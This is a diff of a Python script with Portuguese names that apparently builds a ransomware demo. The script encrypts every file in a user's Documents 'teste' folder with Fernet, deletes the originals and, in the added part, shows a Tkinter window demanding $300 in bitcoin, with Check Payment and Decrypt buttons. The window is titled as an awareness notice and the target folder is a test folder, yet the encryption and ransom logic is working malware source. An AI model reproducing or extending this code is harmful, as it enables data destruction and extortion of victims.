@@ -1,35 +1,9 @@
 from cryptography.fernet import Fernet
 import os
 import platform
-import subprocess
-import pkgutil
-import importlib.resources as resources
-
-
-diretorio = os.path.dirname(os.path.abspath(__file__))
-
-png = "rans.png"
-arquivo_png = os.path.join(diretorio, png)
-
-def abrir_imagem():
-    try:
-        # Acesse a imagem incorporada como um objeto binário
-        imagem_data = pkgutil.get_data("pacote", "rans.png")
-        
-        if os.name == 'nt':
-            # Windows
-            temp_image_path = os.path.join(os.environ["TEMP"], "rans.png")
-            with open(temp_image_path, 'wb') as arq_temp:
-                arq_temp.write(imagem_data)
-            subprocess.run(['explorer.exe', temp_image_path], check=True)
-        elif os.name == 'posix':
-            # Linux
-            temp_image_path = '/tmp/rans.png'
-            with open(temp_image_path, 'wb') as arq_temp:
-                arq_temp.write(imagem_data)
-            subprocess.run(['xdg-open', temp_image_path], check=True)
-    except Exception as erro:
-        print(f"Erro ao abrir a imagem: {erro}")
+import tkinter as tk
+from PIL import Image, ImageTk
+import sys
 
 def user_name():
     if os.name == 'posix':
@@ -87,13 +61,6 @@ def criptografar(diretorio_path):
                 os.remove(file_path)
                 print(f'Arquivo original {filename} removido.')
 
-    # for filename in os.listdir(diretorio_path):
-    #     if filename.startswith('encrypted_'):
-    #         encrypted_file_path = os.path.join(diretorio_path, filename)
-    #         decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
-    #         decrypt_file(encrypted_file_path, key, decrypted_file_path)
-    #         print(f'Arquivo {filename} descriptografado.')
-
     print('Processo de criptografia realizado com sucesso')
 
 def identificar_so():
@@ -106,17 +73,78 @@ def identificar_so():
         nome = user_name()
         diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'
         criptografar(diretorio)
-        abrir_imagem()
+        
     elif 'Linux' in sistema:
         distro = platform.freedesktop_os_release()
         print(distro['NAME'], distro['VERSION'])
         nome = user_name()
         diretorio = f'/home/{nome}/Documentos/teste'
         criptografar(diretorio)
-        abrir_imagem()
+        
     else:
         print(f'Sistema Operacional não reconhecido: {sistema}')
     
     return sistema
 
 so = identificar_so()
+
+def on_decrypt_button_click():
+    key_path = 'key.key'
+    if os.path.exists(key_path):
+        key = load_key(key_path)
+        sistema = platform.system()
+        nome = user_name()
+        if sistema == 'Windows':
+            diretorio_path = f'C:\\Users\\{nome}\\Documents\\Teste'
+        elif sistema == 'Linux':
+            diretorio_path = f'/home/{nome}/Documentos/teste'
+        else:
+            print(f'Sistema Operacional não reconhecido: {sistema}')
+            return
+
+        for filename in os.listdir(diretorio_path):
+            if filename.startswith('encrypted_'):
+                encrypted_file_path = os.path.join(diretorio_path, filename)
+                decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
+                decrypt_file(encrypted_file_path, key, decrypted_file_path)
+                print(f'Arquivo {filename} descriptografado.')
+
+        print('Processo de descriptografia realizado com sucesso')
+
+def exibir_conscientizacao():
+    janela = tk.Tk()
+    janela.title("Aviso de Conscientização")
+    janela.geometry("1280x800")
+    
+    label = tk.Label(janela, justify="left")
+    label.pack()
+    image_path = os.path.join(os.path.abspath(sys._MEIPASS), "pacote/rans.png")
+    image = Image.open(image_path)
+    image = image.resize((800, 600), Image.LANCZOS)
+    photo = ImageTk.PhotoImage(image)
+    imagem_label = tk.Label(janela, image=photo)
+    imagem_label.image = photo
+    imagem_label.pack()
+
+    instrucao_label = tk.Label(janela, text="Send $300 worth of bitcoin to this address:")
+    instrucao_label.pack()
+
+    endereco_label = tk.Label(janela, text="39279fshdfskbAWEas342ssfe24afgDWhkl2313jnsp$Mw")
+    endereco_label.pack()
+
+    botao_copy = tk.Button(janela, text="Copy")
+    botao_copy.pack()
+
+    botao_check = tk.Button(janela, text="Check Payment")
+    botao_check.pack(side=tk.LEFT)
+
+    botao_decrypt = tk.Button(janela, text="Decrypt", command=on_decrypt_button_click)
+    botao_decrypt.pack(side=tk.RIGHT)
+
+    botao_check.place(relx=0.4, rely=0.9, anchor="center")
+    botao_decrypt.place(relx=0.6, rely=0.9, anchor="center")
+
+    janela.mainloop()
+
+if __name__ == "__main__":
+    exibir_conscientizacao()
